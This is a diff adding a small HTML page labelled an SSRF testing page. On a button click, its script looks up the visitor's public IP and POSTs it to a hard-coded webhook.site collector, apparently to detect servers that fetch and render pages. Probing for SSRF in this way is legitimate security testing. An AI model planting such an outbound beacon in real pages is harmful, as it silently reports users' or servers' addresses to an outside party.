@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Testing</title>
+    <script>
+        async function detectHostname() {
+            // Example function to demonstrate SSRF functionality
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const hostname = data.ip;
+            document.getElementById('result').innerText = `Detected Hostname: ${hostname}`;
+
+            // Webhook integration
+            await fetch('https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({hostname: hostname})
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>SSRF Testing Page</h1>
+    <button onclick="detectHostname()">Detect Hostname</button>
+    <p id="result"></p>
+</body>
+</html>
